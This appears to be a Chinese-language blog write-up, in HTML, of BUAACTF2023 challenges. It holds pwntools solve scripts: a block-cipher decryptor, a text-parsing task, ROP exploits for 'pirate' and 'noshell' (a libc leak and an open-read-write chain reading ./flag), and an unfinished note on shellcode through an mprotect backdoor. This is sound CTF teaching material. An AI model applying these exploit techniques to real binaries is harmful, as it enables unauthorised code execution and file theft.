@@ -1,0 +1,1048 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>BUAACTF2023 WP | Iluvata&#39;s Blog</title>
+
+    
+
+
+
+
+
+<meta name="author" content="Iluvata" />
+<meta name="description" content="" />
+
+
+
+<meta name="generator" content="Hugo 0.87.0" />
+
+<link rel="canonical" href="https://iluvata.github.io/post/2023-04-26_buaactf2023/" />
+
+
+<meta property="og:title" content="BUAACTF2023 WP" />
+<meta property="og:description" content="crypto  Block Cipher  直接写个解密
+def decrypt(parts): iv = b&#39;\xba=y\xa3\xc6)\xcf\xf7&#39; key = b&#39;}6E\xeb(\x91\x08\xa0&#39; results = [] for index, part in enumerate(parts): results.append(reduce(xor, [part, iv if index == 0 else parts[index-1], key])) return results      pwn  NLP  pwntools使用。后面的信息提取有点恶心
+#encoding: utf-8 from pwn import * p = remote(&#34;10.212.26.206&#34;, &#34;23004&#34;) for i in range(20): p.recvuntil(&#34;A = :&#34;) a = int(p.recvline()) p.recvuntil(&#34;B = :&#34;) b = int(p." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://iluvata.github.io/post/2023-04-26_buaactf2023/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-03-28T13:53:31+08:00" />
+<meta property="article:modified_time" content="2022-03-28T13:53:31+08:00" />
+
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="BUAACTF2023 WP"/>
+<meta name="twitter:description" content="crypto  Block Cipher  直接写个解密
+def decrypt(parts): iv = b&#39;\xba=y\xa3\xc6)\xcf\xf7&#39; key = b&#39;}6E\xeb(\x91\x08\xa0&#39; results = [] for index, part in enumerate(parts): results.append(reduce(xor, [part, iv if index == 0 else parts[index-1], key])) return results      pwn  NLP  pwntools使用。后面的信息提取有点恶心
+#encoding: utf-8 from pwn import * p = remote(&#34;10.212.26.206&#34;, &#34;23004&#34;) for i in range(20): p.recvuntil(&#34;A = :&#34;) a = int(p.recvline()) p.recvuntil(&#34;B = :&#34;) b = int(p."/>
+
+
+<link rel="stylesheet" href="/css/semantic.min.css" />
+<link rel="stylesheet" href="/css/icomoon.css" />
+<link rel="stylesheet" href="/css/OverlayScrollbars.min.css" />
+<link rel="stylesheet" href="/css/github-markdown.css" />
+<link rel="stylesheet" href="/css/site.css" />
+
+<style>
+  a:hover {
+    text-decoration: underline; 
+  }
+
+  
+  a {
+    color: seagreen !important;
+  }
+  
+
+  
+  .inverted a,
+  .inverted a:hover {
+     color: darkseagreen !important;
+  }
+  
+
+  
+  body.default {
+    
+    background-color: black;
+    
+
+    
+  }
+  
+
+  
+</style>
+
+    
+
+
+
+
+
+
+  </head>
+
+  <body class="default">
+    
+<nav class="ui secondary inverted menu dream-menu">
+
+  <div class="item">
+    <i class="large link bullseye icon dream-flip-toggle" title="Flip it!"></i>
+  </div>
+  <div class="item">
+    <i class="large link home icon" title="Home" onclick="window.location.href = 'https:\/\/iluvata.github.io'"></i>
+  </div>
+  <div class="item">
+    <i class="large link icon theme-switch" onclick="themeSwitch()"></i>
+  </div>
+  
+</nav>
+
+    <div class="flip-container">
+      <div class="flipper">
+        <section class="front">
+          <div class="dream-max-width">
+            
+<div class="ui centered relaxed grid dream-grid">
+  <div class="sixteen wide mobile sixteen wide tablet twelve wide computer column markdown-body dream-single" id="dream-save-post-as-img">
+    
+    <section class="ui top attached segment">
+      <header>
+        <h1 class="ui large header">
+          BUAACTF2023 WP
+          <div class="sub header">
+            @
+            
+              Iluvata
+            
+
+            | 
+                Monday, Mar 28, 2022
+              
+
+            | 4 minutes read
+
+            | Update at
+              
+                Monday, Mar 28, 2022
+              
+          </div>
+        </h1>
+      </header>
+
+      <article class="main">
+<div id="outline-container-headline-1" class="outline-2">
+<h2 id="headline-1">
+crypto
+</h2>
+<div id="outline-text-headline-1" class="outline-text-2">
+<div id="outline-container-headline-2" class="outline-3">
+<h3 id="headline-2">
+Block Cipher
+</h3>
+<div id="outline-text-headline-2" class="outline-text-3">
+<p>直接写个解密</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(parts):
+    iv <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xba</span><span style="color:#e6db74">=y</span><span style="color:#ae81ff">\xa3\xc6</span><span style="color:#e6db74">)</span><span style="color:#ae81ff">\xcf\xf7</span><span style="color:#e6db74">&#39;</span>
+    key <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;}6E</span><span style="color:#ae81ff">\xeb</span><span style="color:#e6db74">(</span><span style="color:#ae81ff">\x91\x08\xa0</span><span style="color:#e6db74">&#39;</span>
+    results <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> index, part <span style="color:#f92672">in</span> enumerate(parts):
+        results<span style="color:#f92672">.</span>append(reduce(xor, [part, iv <span style="color:#66d9ef">if</span> index <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">else</span> parts[index<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>], key]))
+    <span style="color:#66d9ef">return</span> results</code></pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-3" class="outline-2">
+<h2 id="headline-3">
+pwn
+</h2>
+<div id="outline-text-headline-3" class="outline-text-2">
+<div id="outline-container-headline-4" class="outline-3">
+<h3 id="headline-4">
+NLP
+</h3>
+<div id="outline-text-headline-4" class="outline-text-3">
+<p>pwntools使用。后面的信息提取有点恶心</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#encoding: utf-8</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;10.212.26.206&#34;</span>, <span style="color:#e6db74">&#34;23004&#34;</span>)
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>):
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;A = :&#34;</span>)
+    a <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline())
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;B = :&#34;</span>)
+    b <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvline())
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;a &#34;</span>)
+    op <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1</span>)
+    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;b:&#34;</span>)
+    <span style="color:#66d9ef">if</span>(op <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;+&#34;</span>):
+        p<span style="color:#f92672">.</span>sendline(str(a<span style="color:#f92672">+</span>b))
+    <span style="color:#66d9ef">elif</span>(op <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-&#34;</span>):
+        p<span style="color:#f92672">.</span>sendline(str(a<span style="color:#f92672">-</span>b))
+    <span style="color:#66d9ef">elif</span>(op <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;*&#34;</span>):
+        p<span style="color:#f92672">.</span>sendline(str(a<span style="color:#f92672">*</span>b))
+
+ID_address<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;110000&#34;</span>:<span style="color:#e6db74">&#34;北京市&#34;</span>,
+<span style="color:#e6db74">&#34;110100&#34;</span>:<span style="color:#e6db74">&#34;市辖区&#34;</span>,
+<span style="color:#e6db74">&#34;110101&#34;</span>:<span style="color:#e6db74">&#34;东城区&#34;</span>,
+<span style="color:#e6db74">&#34;110102&#34;</span>:<span style="color:#e6db74">&#34;西城区&#34;</span>,
+<span style="color:#e6db74">&#34;110103&#34;</span>:<span style="color:#e6db74">&#34;崇文区&#34;</span>,
+<span style="color:#e6db74">&#34;110104&#34;</span>:<span style="color:#e6db74">&#34;宣武区&#34;</span>,
+<span style="color:#e6db74">&#34;110105&#34;</span>:<span style="color:#e6db74">&#34;朝阳区&#34;</span>,
+<span style="color:#e6db74">&#34;110106&#34;</span>:<span style="color:#e6db74">&#34;丰台区&#34;</span>,
+<span style="color:#e6db74">&#34;110107&#34;</span>:<span style="color:#e6db74">&#34;石景山区&#34;</span>,
+<span style="color:#e6db74">&#34;110108&#34;</span>:<span style="color:#e6db74">&#34;海淀区&#34;</span>,
+<span style="color:#e6db74">&#34;110109&#34;</span>:<span style="color:#e6db74">&#34;门头沟区&#34;</span>,
+<span style="color:#e6db74">&#34;110111&#34;</span>:<span style="color:#e6db74">&#34;房山区&#34;</span>,
+<span style="color:#e6db74">&#34;110112&#34;</span>:<span style="color:#e6db74">&#34;通州区&#34;</span>,
+<span style="color:#e6db74">&#34;110113&#34;</span>:<span style="color:#e6db74">&#34;顺义区&#34;</span>,
+<span style="color:#e6db74">&#34;110114&#34;</span>:<span style="color:#e6db74">&#34;昌平区&#34;</span>,
+<span style="color:#e6db74">&#34;110115&#34;</span>:<span style="color:#e6db74">&#34;大兴区&#34;</span>,
+<span style="color:#e6db74">&#34;110117&#34;</span>:<span style="color:#e6db74">&#34;平谷区&#34;</span>,
+<span style="color:#e6db74">&#34;110116&#34;</span>:<span style="color:#e6db74">&#34;怀柔区&#34;</span>,
+<span style="color:#e6db74">&#34;110228&#34;</span>:<span style="color:#e6db74">&#34;密云区&#34;</span>,
+<span style="color:#e6db74">&#34;110229&#34;</span>:<span style="color:#e6db74">&#34;延庆区&#34;</span>
+}
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sortinfo</span>(info):
+    sortedinfo <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span> ,<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>]
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> info:
+        <span style="color:#66d9ef">if</span> len(i)<span style="color:#f92672">==</span><span style="color:#ae81ff">11</span> <span style="color:#f92672">and</span> i<span style="color:#f92672">.</span>isdigit():
+            sortedinfo[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> i
+        <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#39;@&#39;</span> <span style="color:#f92672">in</span> i:
+            sortedinfo[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> i
+        <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#39;http&#39;</span> <span style="color:#f92672">in</span> i:
+            sortedinfo[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> i[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+        <span style="color:#66d9ef">elif</span> i[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;日&#39;</span>:
+            sortedinfo[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> i
+        <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">in</span> i:
+            sortedinfo[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> i
+        <span style="color:#66d9ef">elif</span> len(i) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">18</span> <span style="color:#f92672">and</span> i[<span style="color:#f92672">-</span><span style="color:#ae81ff">18</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>isdigit():
+            sortedinfo[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> i[<span style="color:#f92672">-</span><span style="color:#ae81ff">18</span>:]
+        <span style="color:#66d9ef">elif</span> <span style="color:#e6db74">&#39;k-&#39;</span> <span style="color:#f92672">in</span> i:
+            sortedinfo[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> i
+        <span style="color:#66d9ef">else</span>:
+            sortedinfo[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> i
+    <span style="color:#66d9ef">return</span> sortedinfo
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parseinfo</span>(infostr):
+    info <span style="color:#f92672">=</span> []
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+        infostr <span style="color:#f92672">=</span> infostr[infostr<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;：&#34;</span>)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>:]
+        s <span style="color:#f92672">=</span> infostr[:infostr<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;。&#34;</span>)]
+        infostr <span style="color:#f92672">=</span> infostr[len(s):]
+        info<span style="color:#f92672">.</span>append(s)
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_id</span>(ID_card):
+        ID_add<span style="color:#f92672">=</span>ID_card[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">6</span>]
+        ID_birth<span style="color:#f92672">=</span>ID_card[<span style="color:#ae81ff">6</span>:<span style="color:#ae81ff">14</span>]
+        ID_pdnum<span style="color:#f92672">=</span>ID_card[<span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">16</span>]
+        ID_sex<span style="color:#f92672">=</span>ID_card[<span style="color:#ae81ff">16</span>:<span style="color:#ae81ff">17</span>]
+        ID_check<span style="color:#f92672">=</span>ID_card[<span style="color:#ae81ff">17</span>:<span style="color:#ae81ff">18</span>]
+        <span style="color:#66d9ef">if</span> int(ID_sex)<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span> <span style="color:#f92672">!=</span><span style="color:#ae81ff">0</span>:
+            sex<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;男&#39;</span>
+        <span style="color:#66d9ef">elif</span> int(ID_sex)<span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>:
+            sex<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;女&#39;</span>
+        output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34; (地区: &#34;</span><span style="color:#f92672">+</span>ID_address[ID_add]
+        output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;, 生日: &#34;</span><span style="color:#f92672">+</span>ID_birth[:<span style="color:#ae81ff">4</span>]<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;年&#34;</span><span style="color:#f92672">+</span>str(int(ID_birth[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">6</span>]))<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;月&#34;</span><span style="color:#f92672">+</span>str(int(ID_birth[<span style="color:#ae81ff">6</span>:]))<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;日&#34;</span>
+        output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;, 性别: &#34;</span><span style="color:#f92672">+</span>sex<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;)&#34;</span>
+        <span style="color:#66d9ef">return</span> output
+    print(info)
+    info <span style="color:#f92672">=</span> sortinfo(info)
+    print(info)
+    output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;电话: &#34;</span><span style="color:#f92672">+</span>info[<span style="color:#ae81ff">0</span>]
+    output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; | 邮箱: &#34;</span><span style="color:#f92672">+</span>info[<span style="color:#ae81ff">1</span>]
+    output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; | URL: &#34;</span><span style="color:#f92672">+</span>info[<span style="color:#ae81ff">2</span>]
+    output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; | 日期: &#34;</span><span style="color:#f92672">+</span>info[<span style="color:#ae81ff">3</span>]
+    output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; | IP: &#34;</span><span style="color:#f92672">+</span>info[<span style="color:#ae81ff">4</span>]
+    output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; | 身份证: &#34;</span><span style="color:#f92672">+</span>info[<span style="color:#ae81ff">5</span>]<span style="color:#f92672">+</span>parse_id(info[<span style="color:#ae81ff">5</span>])
+    output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; | 薪资: &#34;</span><span style="color:#f92672">+</span>info[<span style="color:#ae81ff">6</span>]
+    output <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34; | 工作时间: &#34;</span><span style="color:#f92672">+</span>info[<span style="color:#ae81ff">7</span>]
+    <span style="color:#66d9ef">return</span> output
+<span style="color:#75715e"># def extra():</span>
+<span style="color:#75715e">#     p.recvuntil(&#34;：&#34;)</span>
+<span style="color:#75715e">#     return p.recvuntil(&#34;。&#34;, drop=True)</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Sample Ad:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+samplead <span style="color:#f92672">=</span> str(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Sample Output:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>decode())
+print(samplead)
+parsedsample <span style="color:#f92672">=</span> parseinfo(samplead)
+sample <span style="color:#f92672">=</span> str(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Generated Ad:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>decode())
+print(sample)
+print(parsedsample)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parse_ad</span>():
+
+    infostr <span style="color:#f92672">=</span> str(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Please&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>decode())
+
+    print(infostr)
+    output <span style="color:#f92672">=</span> parseinfo(infostr)
+    print(output)
+    p<span style="color:#f92672">.</span>sendline(output)
+    <span style="color:#75715e"># p.interactive()</span>
+
+<span style="color:#75715e"># p.interactive()</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">20</span>):
+    parse_ad()
+    log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;round&#34;</span><span style="color:#f92672">+</span>str(i))
+p<span style="color:#f92672">.</span>interactive()</code></pre></div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-5" class="outline-3">
+<h3 id="headline-5">
+pirate
+</h3>
+<div id="outline-text-headline-5" class="outline-text-3">
+<p>跟着算法走一遍就行，然后rop跳到后门</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;pirate&#34;</span>)
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;10.212.26.206&#34;</span>, <span style="color:#e6db74">&#34;23002&#34;</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;you and &#34;</span>)
+pir_num <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34; &#34;</span>)) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;have &#34;</span>)
+gold_num <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34; &#34;</span>))
+gold_dist <span style="color:#f92672">=</span> list(range(pir_num<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>))
+gold_rem <span style="color:#f92672">=</span> gold_num
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(pir_num, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+    v6 <span style="color:#f92672">=</span> pir_num <span style="color:#f92672">-</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>
+    v10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(pir_num, i<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>):
+        <span style="color:#66d9ef">if</span> v6 <span style="color:#f92672">==</span> pir_num <span style="color:#f92672">-</span> j <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>:
+            gold_dist[j<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> gold_rem
+            gold_rem <span style="color:#f92672">-=</span> gold_dist[j<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]
+            v10 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+        <span style="color:#66d9ef">elif</span> gold_dist[j<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>:
+            gold_dist[j<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+            gold_rem <span style="color:#f92672">-=</span> <span style="color:#ae81ff">1</span>
+            v10 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
+        <span style="color:#66d9ef">else</span>:
+            gold_rem <span style="color:#f92672">+=</span> gold_dist[j <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]
+            gold_dist[j <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+    <span style="color:#66d9ef">if</span> float(v10)<span style="color:#f92672">/</span>v6 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0.5</span>:
+        <span style="color:#66d9ef">break</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>, pir_num<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>):
+    p<span style="color:#f92672">.</span>sendline(bytes(gold_dist[i]))
+<span style="color:#75715e"># p.interactive()</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;something.&#34;</span>)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x40101a</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x401236</span>)
+p<span style="color:#f92672">.</span>sendline(payload)
+p<span style="color:#f92672">.</span>interactive()</code></pre></div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-6" class="outline-3">
+<h3 id="headline-6">
+noshell
+</h3>
+<div id="outline-text-headline-6" class="outline-text-3">
+<p>基础orw</p>
+<div class="src src-python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;noshell&#34;</span>)
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;10.212.26.206&#34;</span>, <span style="color:#e6db74">&#34;23001&#34;</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;noshell&#34;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;libc-2.27.so&#34;</span>)
+
+num <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x404080</span>
+rdiret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401373</span>
+<span style="color:#75715e"># leak</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;~</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(p64(<span style="color:#ae81ff">0</span>))
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span><span style="color:#f92672">+</span>p64(rdiret)<span style="color:#f92672">+</span>p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>])<span style="color:#f92672">+</span>p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>])<span style="color:#f92672">+</span>p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;main&#39;</span>])
+p<span style="color:#f92672">.</span>send(payload1)
+putsgot <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;puts got: &#34;</span> <span style="color:#f92672">+</span> hex(putsgot))
+libcbase <span style="color:#f92672">=</span> putsgot <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>]
+<span style="color:#75715e"># p.interactive()</span>
+
+o <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;open&#39;</span>]<span style="color:#f92672">+</span>libcbase
+r <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;read&#39;</span>]
+w <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
+
+<span style="color:#75715e"># orw</span>
+rspret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x396c</span> <span style="color:#f92672">+</span> libcbase
+rdxrsiret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x130539</span> <span style="color:#f92672">+</span> libcbase
+payload2 <span style="color:#f92672">=</span> p64(rdiret)<span style="color:#f92672">+</span>p64(num<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">+</span>p64(rdxrsiret)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(o)
+payload2 <span style="color:#f92672">+=</span> p64(rdiret)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x3</span>)<span style="color:#f92672">+</span>p64(rdxrsiret)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">50</span>)<span style="color:#f92672">+</span>p64(num<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">+</span>p64(r)
+payload2 <span style="color:#f92672">+=</span> p64(rdiret)<span style="color:#f92672">+</span>p64(num<span style="color:#f92672">+</span><span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">+</span>p64(w)
+payload2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x100</span><span style="color:#f92672">-</span>len(payload2))
+payload2 <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;./flag</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+
+<span style="color:#75715e"># p.interactive()</span>
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;~</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+p<span style="color:#f92672">.</span>sendline(payload2)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+payload3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span><span style="color:#f92672">+</span>p64(rspret)<span style="color:#f92672">+</span>p64(num)
+p<span style="color:#f92672">.</span>sendline(payload3)
+p<span style="color:#f92672">.</span>interactive()</code></pre></div>
+</div>
+</div>
+</div>
+<div id="outline-container-headline-7" class="outline-3">
+<h3 id="headline-7">
+lose yourself
+</h3>
+<div id="outline-text-headline-7" class="outline-text-3">
+<p>给了一个mprotect后门让.text段可写。程序的功能是每次修改任意地址的1个bit。那思路就是想办法跳转到mprotect后门，然后在代码段写入shellcode，最后想办法跳过去。</p>
+<p>
